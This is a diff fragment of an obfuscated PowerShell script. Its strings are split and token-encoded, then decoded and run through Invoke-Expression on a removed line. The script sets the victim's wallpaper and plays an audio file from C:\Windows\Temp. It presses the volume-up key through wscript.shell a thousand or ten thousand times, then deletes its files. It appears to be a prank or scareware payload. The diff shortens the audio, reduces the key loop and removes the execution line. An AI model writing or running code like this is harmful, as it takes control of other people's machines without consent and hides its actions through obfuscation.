@@ -94,11 +94,7 @@ Se'+'t-WallPaper -Path PDrC:9TBWindows9TBTemp9TBb.jpgPDr -Style Tile
 JMj'+'player = New-Obje'+'ct -TypeName Syste'+'m.Media.SoundPlayer
 JMjplayer.SoundLocation = PDrC:9TBWindows9TBTemp9TBa.wavPDr
 JMj'+'player.Load()
-J'+'Mjplayer.PlayLooping()
-1..10000 4qJ % {(ne'+'w-object -com wscript.shell).SendKeys([char]175)}
+J'+'Mjplayer.Play()
+1..1000 4qJ % {(ne'+'w-object -com wscript.shell).SendKeys([char]175)}
 Remove-Item JMjimgPath -ErrorAction Ignore
 Remove-Item JMjaudiopath -ErrorAction Ignore
-St'+'art-Sleep -Seconds 3
-exit
-
-')-replaCe([cHaR]57+[cHaR]84+[cHaR]66),[cHaR]92 -replaCe 'PDr',[cHaR]39-cReplaCe  ([cHaR]104+[cHaR]112+[cHaR]65),[cHaR]34-cReplaCe 'JMj',[cHaR]36-replaCe  '4qJ',[cHaR]124)| InvoKe-ExPREssiOn
